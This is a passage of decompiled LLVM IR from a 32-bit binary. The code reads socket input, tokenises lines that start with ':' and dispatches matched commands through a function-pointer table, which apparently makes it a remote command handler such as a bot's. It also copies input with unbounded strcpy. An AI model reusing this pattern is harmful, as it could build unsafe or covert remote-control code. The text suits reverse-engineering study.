  %stack_var_-32.2 = phi i32 [ %v1_8049a28, %dec_label_pc_8049a68 ], [ %stack_var_-32.3159, %dec_label_pc_8049994 ]
  %v0_8049abf54 = add i32 %v0_8049abf54.in, 16
  %v0_8049a84 = load i32, i32* @global_var_8056570.268, align 16
  store i32 %v0_8049a84, i32* %eax.global-to-local, align 4
  %v10_8049a89 = icmp ult i32 %.pre, %v0_8049a84
  br i1 %v10_8049a89, label %dec_label_pc_8049994, label %dec_label_pc_8049a92

dec_label_pc_8049a92:                             ; preds = %dec_label_pc_8049a84.preheader, %dec_label_pc_8049a81
  %v0_80499a6.lcssa = phi i32 [ %v1_804997d, %dec_label_pc_8049a84.preheader ], [ %v0_8049abf54, %dec_label_pc_8049a81 ]
  %stack_var_-32.3.lcssa = phi i32 [ %stack_var_-32.1, %dec_label_pc_8049a84.preheader ], [ %stack_var_-32.2, %dec_label_pc_8049a81 ]
  %storemerge17.lcssa = phi i32 [ 0, %dec_label_pc_8049a84.preheader ], [ %.pre, %dec_label_pc_8049a81 ]
  %v0_8049a92 = load i32, i32* @global_var_8056f38.296, align 8
  %v2_8049a97 = udiv i32 %v0_8049a92, 32
  store i32 %v2_8049a97, i32* %eax.global-to-local, align 4
  %v0_8049a9a = load i32, i32* @ebp, align 4
  %v2_8049a9a = mul nuw nsw i32 %v2_8049a97, 4
  %v3_8049a9a = add nsw i32 %v2_8049a9a, -648
  %v4_8049a9a = add i32 %v3_8049a9a, %v0_8049a9a
  %v5_8049a9a = inttoptr i32 %v4_8049a9a to i32*
  %v6_8049a9a = load i32, i32* %v5_8049a9a, align 4
  store i32 %v6_8049a9a, i32* %edx.global-to-local, align 4
  %v1_8049aa8 = urem i32 %v0_8049a92, 32
  %v2_8049aa8 = icmp eq i32 %v1_8049aa8, 0
  store i32 %v1_8049aa8, i32* %ecx.global-to-local, align 4
  br i1 %v2_8049aa8, label %bb124, label %bb123

bb123:                                            ; preds = %dec_label_pc_8049a92
  %v5_8049aad = lshr i32 %v6_8049a9a, %v1_8049aa8
  br label %bb124

bb124:                                            ; preds = %dec_label_pc_8049a92, %bb123
  %v0_8049aaf = phi i32 [ %v5_8049aad, %bb123 ], [ %v6_8049a9a, %dec_label_pc_8049a92 ]
  %v1_8049aaf = urem i32 %v0_8049aaf, 2
  %v2_8049aaf = icmp eq i32 %v1_8049aaf, 0
  store i32 %v1_8049aaf, i32* %eax.global-to-local, align 4
  br i1 %v2_8049aaf, label %dec_label_pc_8049905.lr.ph, label %dec_label_pc_8049aba

dec_label_pc_8049aba:                             ; preds = %bb124
  store i32 %v0_8049a92, i32* %eax.global-to-local, align 4
  %v1_8049abf = add i32 %v0_80499a6.lcssa, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 0, i32* %v2_8049abf, align 4
  %v1_8049ac1 = add i32 %v0_80499a6.lcssa, -8
  %v2_8049ac1 = inttoptr i32 %v1_8049ac1 to i32*
  store i32 4096, i32* %v2_8049ac1, align 4
  store i32 %v2_8049ac6, i32* %edx.global-to-local, align 4
  %v2_8049acc = add i32 %v0_80499a6.lcssa, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v2_8049ac6, i32* %v3_8049acc, align 4
  %v0_8049acd = load i32, i32* %eax.global-to-local, align 4
  %v2_8049acd = add i32 %v0_80499a6.lcssa, -16
  %v3_8049acd = inttoptr i32 %v2_8049acd to i32*
  store i32 %v0_8049acd, i32* %v3_8049acd, align 4
  %v4_8049ace = call i32 @recv(i32 %storemerge17.lcssa, i32 0, i32 %tmp119, i32 %stack_var_-32.3.lcssa)
  store i32 %v4_8049ace, i32* %eax.global-to-local, align 4
  store i32 %v4_8049ace, i32* %tmp117, align 4
  %tmp125 = icmp slt i32 %v4_8049ace, 1
  br i1 %tmp125, label %dec_label_pc_80498a6, label %dec_label_pc_8049ae3

dec_label_pc_8049ae3:                             ; preds = %dec_label_pc_8049aba
  %v0_8049ae6 = load i32, i32* @ebp, align 4
  %v2_8049ae6 = add i32 %v4_8049ace, -6792
  %v3_8049ae6 = add i32 %v2_8049ae6, %v0_8049ae6
  %v4_8049ae6 = inttoptr i32 %v3_8049ae6 to i8*
  store i8 0, i8* %v4_8049ae6, align 1
  %v0_8049aee = load i32, i32* @esp, align 4
  %v1_8049af1 = add i32 %v0_8049aee, -12
  %v2_8049af1 = inttoptr i32 %v1_8049af1 to i32*
  store i32 ptrtoint (i32* @global_var_805447d.314 to i32), i32* %v2_8049af1, align 4
  store i32 %v2_8049ac6, i32* %eax.global-to-local, align 4
  %v2_8049afc = add i32 %v0_8049aee, -16
  %v3_8049afc = inttoptr i32 %v2_8049afc to i32*
  store i32 %v2_8049ac6, i32* %v3_8049afc, align 4
  %v0_8049afd = load i8*, i8** %stack_var_-20, align 4
  %v1_8049afd = ptrtoint i8* %v0_8049afd to i32
  %v2_8049afd = call i32 @strtok(i32 %v1_8049afd)
  store i32 %v2_8049afd, i32* %eax.global-to-local, align 4
  %v0_8049b02 = load i32, i32* @esp, align 4
  %v5_8049b05 = inttoptr i32 %v2_8049afd to i8*
  store i8* %v5_8049b05, i8** %stack_var_-24, align 4
  %v5_8049c9537 = icmp eq i32 %v2_8049afd, 0
  br i1 %v5_8049c9537, label %dec_label_pc_8049905.lr.ph, label %dec_label_pc_8049c9f

dec_label_pc_8049b0d:                             ; preds = %dec_label_pc_8049c9f
  %v7_8049b10 = inttoptr i32 %v0_8049b0d.in to i32*
  store i32 %v4_8049c9f, i32* %v7_8049b10, align 4
  %v0_8049b13 = load i8*, i8** %stack_var_-24, align 4
  %v3_8049b13 = call i32 @filter(i8* %v0_8049b13)
  %v0_8049b18 = load i32, i32* @esp, align 4
  %v4_8049b1b = ptrtoint i8* %v0_8049b13 to i32
  store i32 %v4_8049b1b, i32* %eax.global-to-local, align 4
  %v2_8049b1e = load i8, i8* %v0_8049b13, align 1
  %v3_8049b1e = zext i8 %v2_8049b1e to i32
  %v5_8049b1e = and i32 %v4_8049b1b, -256
  %v6_8049b1e = or i32 %v3_8049b1e, %v5_8049b1e
  store i32 %v6_8049b1e, i32* %eax.global-to-local, align 4
  %v10_8049b20 = icmp eq i8 %v2_8049b1e, 58
  %v1_8049b22 = icmp eq i1 %v10_8049b20, false
  br i1 %v1_8049b22, label %dec_label_pc_8049b89, label %dec_label_pc_8049b30

dec_label_pc_8049b2d:                             ; preds = %dec_label_pc_8049b45
  %v5_8049b2d = add i32 %v4_8049b45, 1
  %v22_8049b2d = inttoptr i32 %v5_8049b2d to i8*
  br label %dec_label_pc_8049b30

dec_label_pc_8049b30:                             ; preds = %dec_label_pc_8049b0d, %dec_label_pc_8049b2d
  %v3_8049b36 = phi i8* [ %v4_8049b48, %dec_label_pc_8049b2d ], [ %v0_8049b13, %dec_label_pc_8049b0d ]
  %v0_8049b33.in = phi i32 [ %v0_8049b3e, %dec_label_pc_8049b2d ], [ %v0_8049b18, %dec_label_pc_8049b0d ]
  %storemerge15 = phi i8* [ %v22_8049b2d, %dec_label_pc_8049b2d ], [ null, %dec_label_pc_8049b0d ]
  store i8* %storemerge15, i8** %stack_var_-20, align 4
  %v4_8049b30 = ptrtoint i8* %storemerge15 to i32
  store i32 %v4_8049b30, i32* @ebx, align 4
  %v4_8049b36 = ptrtoint i8* %v3_8049b36 to i32
  %v7_8049b36 = inttoptr i32 %v0_8049b33.in to i32*
  store i32 %v4_8049b36, i32* %v7_8049b36, align 4
  %v0_8049b39 = load i8*, i8** %stack_var_-20, align 4
  %v3_8049b39 = call i32 @strlen(i8* %v0_8049b39)
  store i32 %v3_8049b39, i32* %eax.global-to-local, align 4
  %v0_8049b3e = load i32, i32* @esp, align 4
  %v0_8049b41 = load i32, i32* @ebx, align 4
  %v7_8049b41 = icmp ult i32 %v0_8049b41, %v3_8049b39
  %v1_8049b43 = icmp eq i1 %v7_8049b41, false
  %v3_8049b51.pre = load i8*, i8** %stack_var_-20, align 4
  br i1 %v1_8049b43, label %dec_label_pc_8049b30.dec_label_pc_8049b51_crit_edge, label %dec_label_pc_8049b45

dec_label_pc_8049b30.dec_label_pc_8049b51_crit_edge: ; preds = %dec_label_pc_8049b30
  %v4_8049b54.pre = load i8*, i8** %stack_var_-24, align 4
  %.pre180 = ptrtoint i8* %v3_8049b51.pre to i32
  br label %dec_label_pc_8049b51

dec_label_pc_8049b45:                             ; preds = %dec_label_pc_8049b30
  %v4_8049b45 = ptrtoint i8* %v3_8049b51.pre to i32
  %v4_8049b48 = load i8*, i8** %stack_var_-24, align 4
  %v5_8049b48 = ptrtoint i8* %v4_8049b48 to i32
  %v6_8049b48 = add i32 %v5_8049b48, %v4_8049b45
  store i32 %v6_8049b48, i32* %eax.global-to-local, align 4
  %v1_8049b4b = inttoptr i32 %v6_8049b48 to i8*
  %v2_8049b4b = load i8, i8* %v1_8049b4b, align 1
  %v3_8049b4b = zext i8 %v2_8049b4b to i32
  %v5_8049b4b = and i32 %v6_8049b48, -256
  %v6_8049b4b = or i32 %v3_8049b4b, %v5_8049b4b
  store i32 %v6_8049b4b, i32* %eax.global-to-local, align 4
  %v7_8049b4d = icmp eq i8 %v2_8049b4b, 32
  %v1_8049b4f = icmp eq i1 %v7_8049b4d, false
  br i1 %v1_8049b4f, label %dec_label_pc_8049b2d, label %dec_label_pc_8049b51

dec_label_pc_8049b51:                             ; preds = %dec_label_pc_8049b45, %dec_label_pc_8049b30.dec_label_pc_8049b51_crit_edge
  %v4_8049b51.pre-phi = phi i32 [ %.pre180, %dec_label_pc_8049b30.dec_label_pc_8049b51_crit_edge ], [ %v4_8049b45, %dec_label_pc_8049b45 ]
  %v4_8049b54 = phi i8* [ %v4_8049b54.pre, %dec_label_pc_8049b30.dec_label_pc_8049b51_crit_edge ], [ %v4_8049b48, %dec_label_pc_8049b45 ]
  %v5_8049b54 = ptrtoint i8* %v4_8049b54 to i32
  %v6_8049b54 = add i32 %v5_8049b54, %v4_8049b51.pre-phi
  %v1_8049b57 = inttoptr i32 %v6_8049b54 to i8*
  store i8 0, i8* %v1_8049b57, align 1
  %v3_8049b5a = load i8*, i8** %stack_var_-24, align 4
  %v4_8049b5a = ptrtoint i8* %v3_8049b5a to i32
  %v1_8049b5d = add i32 %v4_8049b5a, 1
  %v0_8049b5e = load i32, i32* @esp, align 4
  %v2_8049b61 = add i32 %v0_8049b5e, -12
  %v3_8049b61 = inttoptr i32 %v2_8049b61 to i32*
  store i32 %v1_8049b5d, i32* %v3_8049b61, align 4
  store i32 %v2_8049b93, i32* %eax.global-to-local, align 4
  %v2_8049b68 = add i32 %v0_8049b5e, -16
  %v3_8049b68 = inttoptr i32 %v2_8049b68 to i32*
  store i32 %v2_8049b93, i32* %v3_8049b68, align 4
  %v0_8049b69 = load i8*, i8** %stack_var_-20, align 4
  %v1_8049b69 = ptrtoint i8* %v0_8049b69 to i32
  %v3_8049b69 = call i32 @strcpy(i32 %v1_8049b69, i32 %v2_8049587)
  %v0_8049b6e = load i32, i32* @esp, align 4
  %v3_8049b71 = load i8*, i8** %stack_var_-20, align 4
  %v4_8049b71 = ptrtoint i8* %v3_8049b71 to i32
  %v4_8049b74 = load i8*, i8** %stack_var_-24, align 4
  %v5_8049b74 = ptrtoint i8* %v4_8049b74 to i32
  %v6_8049b74 = add i32 %v4_8049b71, 1
  %v1_8049b77 = add i32 %v6_8049b74, %v5_8049b74
  store i32 %v1_8049b77, i32* %eax.global-to-local, align 4
  %v2_8049b7b = add i32 %v0_8049b6e, 4
  %v3_8049b7b = inttoptr i32 %v2_8049b7b to i32*
  store i32 %v1_8049b77, i32* %v3_8049b7b, align 4
  %v3_8049b7c = load i8*, i8** %stack_var_-24, align 4
  %v4_8049b7c = ptrtoint i8* %v3_8049b7c to i32
  %v7_8049b7c = inttoptr i32 %v0_8049b6e to i32*
  store i32 %v4_8049b7c, i32* %v7_8049b7c, align 4
  %v0_8049b7f = load i8*, i8** %stack_var_-20, align 4
  %v1_8049b7f = ptrtoint i8* %v0_8049b7f to i32
  %v3_8049b7f = call i32 @strcpy(i32 %v1_8049b7f, i32 %v2_8049587)
  br label %dec_label_pc_8049ba2

dec_label_pc_8049b89:                             ; preds = %dec_label_pc_8049b0d
  %v1_8049b8c = add i32 %v0_8049b18, 8
  %v2_8049b8c = inttoptr i32 %v1_8049b8c to i32*
  store i32 2, i32* %v2_8049b8c, align 4
  %v1_8049b8e = add i32 %v0_8049b18, 4
  %v2_8049b8e = inttoptr i32 %v1_8049b8e to i32*
  store i32 ptrtoint (i32* @global_var_805447f.315 to i32), i32* %v2_8049b8e, align 4
  store i32 %v2_8049b93, i32* %eax.global-to-local, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b18 to i32*
  store i32 %v2_8049b93, i32* %v3_8049b99, align 4
  %v0_8049b9a = load i8*, i8** %stack_var_-20, align 4
  %v5_8049b9a = call i32 @memcpy(i8* %v0_8049b9a, i32 %v2_8049587, i32 %v0_8049594)
  br label %dec_label_pc_8049ba2

dec_label_pc_8049ba2:                             ; preds = %dec_label_pc_8049b51, %dec_label_pc_8049b89
  %storemerge182 = phi i32 [ %v3_8049b7f, %dec_label_pc_8049b51 ], [ %v5_8049b9a, %dec_label_pc_8049b89 ]
  store i32 %storemerge182, i32* %eax.global-to-local, align 4
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %v3_8049bb4.pre = load i8*, i8** %stack_var_-24, align 4
  br label %dec_label_pc_8049bae

dec_label_pc_8049bab:                             ; preds = %dec_label_pc_8049bc3
  %v5_8049bab = add i32 %v4_8049bc3, 1
  %v22_8049bab = inttoptr i32 %v5_8049bab to i8*
  br label %dec_label_pc_8049bae

dec_label_pc_8049bae:                             ; preds = %dec_label_pc_8049ba2, %dec_label_pc_8049bab
  %v3_8049bb4 = phi i8* [ %v4_8049bc6, %dec_label_pc_8049bab ], [ %v3_8049bb4.pre, %dec_label_pc_8049ba2 ]
  %v0_8049bb1.in = phi i32 [ %v0_8049bbc, %dec_label_pc_8049bab ], [ %storemerge23.in.in, %dec_label_pc_8049ba2 ]
  %storemerge14 = phi i8* [ %v22_8049bab, %dec_label_pc_8049bab ], [ null, %dec_label_pc_8049ba2 ]
  store i8* %storemerge14, i8** %stack_var_-20, align 4
  %v4_8049bae = ptrtoint i8* %storemerge14 to i32
  store i32 %v4_8049bae, i32* @ebx, align 4
  %v4_8049bb4 = ptrtoint i8* %v3_8049bb4 to i32
  %v7_8049bb4 = inttoptr i32 %v0_8049bb1.in to i32*
  store i32 %v4_8049bb4, i32* %v7_8049bb4, align 4
  %v0_8049bb7 = load i8*, i8** %stack_var_-20, align 4
  %v3_8049bb7 = call i32 @strlen(i8* %v0_8049bb7)
  store i32 %v3_8049bb7, i32* %eax.global-to-local, align 4
  %v0_8049bbc = load i32, i32* @esp, align 4
  %v0_8049bbf = load i32, i32* @ebx, align 4
  %v7_8049bbf = icmp ult i32 %v0_8049bbf, %v3_8049bb7
  %v1_8049bc1 = icmp eq i1 %v7_8049bbf, false
  %v3_8049bcf.pre = load i8*, i8** %stack_var_-20, align 4
  br i1 %v1_8049bc1, label %dec_label_pc_8049bae.dec_label_pc_8049bcf_crit_edge, label %dec_label_pc_8049bc3

dec_label_pc_8049bae.dec_label_pc_8049bcf_crit_edge: ; preds = %dec_label_pc_8049bae
  %v4_8049bd2.pre = load i8*, i8** %stack_var_-24, align 4
  %.pre179 = ptrtoint i8* %v3_8049bcf.pre to i32
  br label %dec_label_pc_8049bcf

dec_label_pc_8049bc3:                             ; preds = %dec_label_pc_8049bae
  %v4_8049bc3 = ptrtoint i8* %v3_8049bcf.pre to i32
  %v4_8049bc6 = load i8*, i8** %stack_var_-24, align 4
  %v5_8049bc6 = ptrtoint i8* %v4_8049bc6 to i32
  %v6_8049bc6 = add i32 %v5_8049bc6, %v4_8049bc3
  store i32 %v6_8049bc6, i32* %eax.global-to-local, align 4
  %v1_8049bc9 = inttoptr i32 %v6_8049bc6 to i8*
  %v2_8049bc9 = load i8, i8* %v1_8049bc9, align 1
  %v3_8049bc9 = zext i8 %v2_8049bc9 to i32
  %v5_8049bc9 = and i32 %v6_8049bc6, -256
  %v6_8049bc9 = or i32 %v3_8049bc9, %v5_8049bc9
  store i32 %v6_8049bc9, i32* %eax.global-to-local, align 4
  %v7_8049bcb = icmp eq i8 %v2_8049bc9, 32
  %v1_8049bcd = icmp eq i1 %v7_8049bcb, false
  br i1 %v1_8049bcd, label %dec_label_pc_8049bab, label %dec_label_pc_8049bcf

dec_label_pc_8049bcf:                             ; preds = %dec_label_pc_8049bc3, %dec_label_pc_8049bae.dec_label_pc_8049bcf_crit_edge
  %v4_8049bcf.pre-phi = phi i32 [ %.pre179, %dec_label_pc_8049bae.dec_label_pc_8049bcf_crit_edge ], [ %v4_8049bc3, %dec_label_pc_8049bc3 ]
  %v4_8049bd2 = phi i8* [ %v4_8049bd2.pre, %dec_label_pc_8049bae.dec_label_pc_8049bcf_crit_edge ], [ %v4_8049bc6, %dec_label_pc_8049bc3 ]
  %v5_8049bd2 = ptrtoint i8* %v4_8049bd2 to i32
  %v6_8049bd2 = add i32 %v5_8049bd2, %v4_8049bcf.pre-phi
  %v1_8049bd5 = inttoptr i32 %v6_8049bd2 to i8*
  store i8 0, i8* %v1_8049bd5, align 1
  %v0_8049bd8 = load i32, i32* @esp, align 4
  %v3_8049bdb = load i8*, i8** %stack_var_-24, align 4
  %v4_8049bdb = ptrtoint i8* %v3_8049bdb to i32
  %v6_8049bdb = add i32 %v0_8049bd8, -12
  %v7_8049bdb = inttoptr i32 %v6_8049bdb to i32*
  store i32 %v4_8049bdb, i32* %v7_8049bdb, align 4
  store i32 %v2_8049bde, i32* %eax.global-to-local, align 4
  %v2_8049be4 = add i32 %v0_8049bd8, -16
  %v3_8049be4 = inttoptr i32 %v2_8049be4 to i32*
  store i32 %v2_8049bde, i32* %v3_8049be4, align 4
  %v0_8049be5 = load i8*, i8** %stack_var_-20, align 4
  %v1_8049be5 = ptrtoint i8* %v0_8049be5 to i32
  %v3_8049be5 = call i32 @strcpy(i32 %v1_8049be5, i32 %v2_8049587)
  %v0_8049bea = load i32, i32* @esp, align 4
  %v3_8049bed = load i8*, i8** %stack_var_-20, align 4
  %v4_8049bed = ptrtoint i8* %v3_8049bed to i32
  %v4_8049bf0 = load i8*, i8** %stack_var_-24, align 4
  %v5_8049bf0 = ptrtoint i8* %v4_8049bf0 to i32
  %v6_8049bf0 = add i32 %v4_8049bed, 1
  %v1_8049bf3 = add i32 %v6_8049bf0, %v5_8049bf0
  store i32 %v1_8049bf3, i32* %eax.global-to-local, align 4
  %v2_8049bf7 = add i32 %v0_8049bea, 4
  %v3_8049bf7 = inttoptr i32 %v2_8049bf7 to i32*
  store i32 %v1_8049bf3, i32* %v3_8049bf7, align 4
  %v3_8049bf8 = load i8*, i8** %stack_var_-24, align 4
  %v4_8049bf8 = ptrtoint i8* %v3_8049bf8 to i32
  %v7_8049bf8 = inttoptr i32 %v0_8049bea to i32*
  store i32 %v4_8049bf8, i32* %v7_8049bf8, align 4
  %v0_8049bfb = load i8*, i8** %stack_var_-20, align 4
  %v1_8049bfb = ptrtoint i8* %v0_8049bfb to i32
  %v3_8049bfb = call i32 @strcpy(i32 %v1_8049bfb, i32 %v2_8049587)
  %v0_8049c00 = load i32, i32* @esp, align 4
  %v1_8049c00 = add i32 %v0_8049c00, 16
  store i8* null, i8** %stack_var_-20, align 4
  %v4_8049c56164 = load i32, i32* bitcast ([4 x i8]** @global_var_8056500.317 to i32*), align 8
  store i32 %v4_8049c56164, i32* %eax.global-to-local, align 4
  %v1_8049c5d165 = icmp eq i32 %v4_8049c56164, 0
  %v1_8049c5f167 = icmp eq i1 %v1_8049c5d165, false
  br i1 %v1_8049c5f167, label %dec_label_pc_8049c0c, label %dec_label_pc_8049c61

dec_label_pc_8049c0c:                             ; preds = %dec_label_pc_8049bcf, %dec_label_pc_8049c0c
  %v3_8049c56170 = phi i32* [ %v3_8049c56, %dec_label_pc_8049c0c ], [ bitcast ([4 x i8]** @global_var_8056500.317 to i32*), %dec_label_pc_8049bcf ]
  %v4_8049c53169 = phi i32 [ %v5_8049c50, %dec_label_pc_8049c0c ], [ 0, %dec_label_pc_8049bcf ]
  %v0_8049c16168 = phi i32 [ %v1_8049c4d, %dec_label_pc_8049c0c ], [ %v1_8049c00, %dec_label_pc_8049bcf ]
  store i32 %v4_8049c53169, i32* %eax.global-to-local, align 4
  %v4_8049c0f = load i32, i32* %v3_8049c56170, align 8
  store i32 %v4_8049c0f, i32* %edx.global-to-local, align 4
  store i32 %v2_8049bde, i32* %eax.global-to-local, align 4
  %v2_8049c1f = add i32 %v0_8049c16168, -12
  %v3_8049c1f = inttoptr i32 %v2_8049c1f to i32*
  store i32 %v2_8049bde, i32* %v3_8049c1f, align 4
  %v0_8049c20 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049c20 = add i32 %v0_8049c16168, -16
  %v3_8049c20 = inttoptr i32 %v2_8049c20 to i32*
  store i32 %v0_8049c20, i32* %v3_8049c20, align 4
  %v0_8049c21 = load i8*, i8** %stack_var_-20, align 4
  %v4_8049c21 = call i32 @strcasecmp(i8* %v0_8049c21, i32 %v2_8049587)
  %v0_8049c26 = load i32, i32* @esp, align 4
  %v3_8049c2d = load i8*, i8** %stack_var_-20, align 4
  %v4_8049c2d = ptrtoint i8* %v3_8049c2d to i32
  store i32 %v4_8049c2d, i32* %eax.global-to-local, align 4
  %v1_8049c30 = mul i32 %v4_8049c2d, 8
  %v2_8049c30 = add i32 %v1_8049c30, ptrtoint (i32* @global_var_8056504.318 to i32)
  %v3_8049c30 = inttoptr i32 %v2_8049c30 to i32*
  %v4_8049c30 = load i32, i32* %v3_8049c30, align 4
  store i32 %v4_8049c30, i32* %ecx.global-to-local, align 4
  %v0_8049c37 = load i32, i32* @global_var_8056f38.296, align 8
  store i32 %v0_8049c37, i32* %edx.global-to-local, align 4
  %v3_8049c40 = load i8*, i8** %stack_var_-24, align 4
  %v4_8049c40 = ptrtoint i8* %v3_8049c40 to i32
  %v6_8049c40 = add i32 %v0_8049c26, 8
  %v7_8049c40 = inttoptr i32 %v6_8049c40 to i32*
  store i32 %v4_8049c40, i32* %v7_8049c40, align 4
  store i32 %v2_8049b93, i32* %eax.global-to-local, align 4
  %v2_8049c49 = add i32 %v0_8049c26, 4
  %v3_8049c49 = inttoptr i32 %v2_8049c49 to i32*
  store i32 %v2_8049b93, i32* %v3_8049c49, align 4
  %v0_8049c4a = load i32, i32* %edx.global-to-local, align 4
  %v3_8049c4a = inttoptr i32 %v0_8049c26 to i32*
  store i32 %v0_8049c4a, i32* %v3_8049c4a, align 4
  %v1_8049c4b = add i32 %v0_8049c26, -4
  %v2_8049c4b = inttoptr i32 %v1_8049c4b to i32*
  store i32 134519885, i32* %v2_8049c4b, align 4
  call void @__pseudo_call(i32 %v4_8049c30)
  %v0_8049c4d = load i32, i32* @esp, align 4
  %v1_8049c4d = add i32 %v0_8049c4d, 16
  %v3_8049c50 = load i8*, i8** %stack_var_-20, align 4
  %v4_8049c50 = ptrtoint i8* %v3_8049c50 to i32
  %v5_8049c50 = add i32 %v4_8049c50, 1
  %v22_8049c50 = inttoptr i32 %v5_8049c50 to i8*
  store i8* %v22_8049c50, i8** %stack_var_-20, align 4
  store i32 %v5_8049c50, i32* %eax.global-to-local, align 4
  %v1_8049c56 = mul i32 %v5_8049c50, 8
  %v2_8049c56 = add i32 %v1_8049c56, ptrtoint ([4 x i8]** @global_var_8056500.317 to i32)
  %v3_8049c56 = inttoptr i32 %v2_8049c56 to i32*
  %v4_8049c56 = load i32, i32* %v3_8049c56, align 8
  store i32 %v4_8049c56, i32* %eax.global-to-local, align 4
  %v1_8049c5d = icmp eq i32 %v4_8049c56, 0
  %v1_8049c5f = icmp eq i1 %v1_8049c5d, false
  br i1 %v1_8049c5f, label %dec_label_pc_8049c0c, label %dec_label_pc_8049c61

dec_label_pc_8049c61:                             ; preds = %dec_label_pc_8049c0c, %dec_label_pc_8049bcf
  %v0_8049c16.lcssa = phi i32 [ %v1_8049c00, %dec_label_pc_8049bcf ], [ %v1_8049c4d, %dec_label_pc_8049c0c ]
  %v1_8049c64 = add i32 %v0_8049c16.lcssa, -12
  %v2_8049c64 = inttoptr i32 %v1_8049c64 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054481.319 to i32), i32* %v2_8049c64, align 4
  store i32 %v2_8049bde, i32* %eax.global-to-local, align 4
  %v2_8049c6f = add i32 %v0_8049c16.lcssa, -16
  %v3_8049c6f = inttoptr i32 %v2_8049c6f to i32*
  store i32 %v2_8049bde, i32* %v3_8049c6f, align 4
  %v0_8049c70 = load i8*, i8** %stack_var_-20, align 4
  %v4_8049c70 = call i32 @strcasecmp(i8* %v0_8049c70, i32 %v2_8049587)
  store i32 %v4_8049c70, i32* %eax.global-to-local, align 4
  %v0_8049c75 = load i32, i32* @esp, align 4
  %v1_8049c78 = icmp eq i32 %v4_8049c70, 0
  br i1 %v1_8049c78, label %dec_label_pc_80498a6, label %dec_label_pc_8049c80

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049c61
  %v1_8049c83 = add i32 %v0_8049c75, 4
  %v2_8049c83 = inttoptr i32 %v1_8049c83 to i32*
  store i32 ptrtoint (i32* @global_var_805447d.314 to i32), i32* %v2_8049c83, align 4
  %v2_8049c88 = inttoptr i32 %v0_8049c75 to i32*
  store i32 0, i32* %v2_8049c88, align 4
  %v0_8049c8a = load i8*, i8** %stack_var_-20, align 4
  %v1_8049c8a = ptrtoint i8* %v0_8049c8a to i32
  %v2_8049c8a = call i32 @strtok(i32 %v1_8049c8a)
  store i32 %v2_8049c8a, i32* %eax.global-to-local, align 4
  %v0_8049c8f = load i32, i32* @esp, align 4
  store i32 %v2_8049c8a, i32* %tmp118, align 4
  %v5_8049c95 = icmp eq i32 %v2_8049c8a, 0
  %tmp126 = inttoptr i32 %v2_8049c8a to i8*
  br i1 %v5_8049c95, label %dec_label_pc_8049905.lr.ph, label %dec_label_pc_8049c9f

dec_label_pc_8049c9f:                             ; preds = %dec_label_pc_8049ae3, %dec_label_pc_8049c80
  %v3_8049b10 = phi i8* [ %tmp126, %dec_label_pc_8049c80 ], [ %v5_8049b05, %dec_label_pc_8049ae3 ]
  %v0_8049b0d.in = phi i32 [ %v0_8049c8f, %dec_label_pc_8049c80 ], [ %v0_8049b02, %dec_label_pc_8049ae3 ]
  %v4_8049c9f = ptrtoint i8* %v3_8049b10 to i32
  store i32 %v4_8049c9f, i32* %eax.global-to-local, align 4
  %v2_8049ca2 = load i8, i8* %v3_8049b10, align 1
  %v3_8049ca2 = zext i8 %v2_8049ca2 to i32
  %v5_8049ca2 = and i32 %v4_8049c9f, -256
  %v6_8049ca2 = or i32 %v3_8049ca2, %v5_8049ca2
  store i32 %v6_8049ca2, i32* %eax.global-to-local, align 4
  %v4_8049ca4 = icmp eq i8 %v2_8049ca2, 0
  %v1_8049ca6 = icmp eq i1 %v4_8049ca4, false
  br i1 %v1_8049ca6, label %dec_label_pc_8049b0d, label %dec_label_pc_8049905.lr.ph

; uselistorder directives
  uselistorder i32 %v4_8049c9f, { 1, 2, 0 }
  uselistorder i32 %v2_8049c8a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8049c75, { 1, 0 }
  uselistorder i32* %v3_8049c56, { 1, 0 }
  uselistorder i32 %v5_8049c50, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8049c26, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8049bea, { 1, 0 }
  uselistorder i8* %v4_8049bc6, { 0, 2, 1 }
  uselistorder i8* %v3_8049bcf.pre, { 1, 0 }
  uselistorder i32 %v0_8049b6e, { 1, 0 }
  uselistorder i8* %v4_8049b48, { 0, 2, 1 }
  uselistorder i8* %v3_8049b51.pre, { 1, 0 }
  uselistorder i32 %v0_8049b18, { 3, 1, 2, 0 }
  uselistorder i8* %v0_8049b13, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049aaf, { 1, 0 }
  uselistorder i32 %v1_8049aa8, { 2, 1, 0 }
  uselistorder i32 %v2_8049a97, { 1, 0 }
  uselistorder i32 %v0_8049a92, { 2, 1, 0 }
  uselistorder i32 %stack_var_-32.3.lcssa, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8049abf54, { 1, 0 }
  uselistorder i32 %v4_8049a5b, { 1, 2, 0 }
  uselistorder i32 %v2_8049a3f, { 2, 0, 1 }
  uselistorder i32 %storemerge18147, { 1, 0 }
  uselistorder i32 %v1_8049a28, { 1, 3, 2, 0 }
  uselistorder i32 %v2_8049a21, { 1, 0 }
  uselistorder i32 %v2_80499d2, { 1, 0, 2 }
  uselistorder i32 %v0_80499c7, { 1, 0 }
  uselistorder i32 %v4_80499ec, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80499d2142, { 1, 0 }
  uselistorder i32 %v2_80499d5143, { 1, 0 }
  uselistorder i32 %v2_80499d2138, { 2, 1, 0 }
  uselistorder i32 %.pre, { 1, 5, 2, 3, 0, 6, 4 }
  uselistorder i32 %v2_8049997, { 1, 0 }
  uselistorder i32 %stack_var_-32.3159, { 1, 0 }
  uselistorder i32 %storemerge17160, { 2, 1, 0 }
  uselistorder i32 %v1_8049933, { 2, 1, 0 }
  uselistorder i32 %v2_8049920, { 2, 1, 0 }
  uselistorder i32 %v0_804991b, { 1, 0 }
  uselistorder i32 %stack_var_-36.032, { 2, 0, 1 }
  uselistorder i32 %v2_8049b93, { 3, 2, 4, 5, 1, 0 }
  uselistorder i32 %v2_80498f3, { 2, 3, 1, 4, 0 }
  uselistorder i8* %tmp116, { 1, 0, 2 }
  uselistorder i32 %v2_8049817, { 1, 0, 2 }
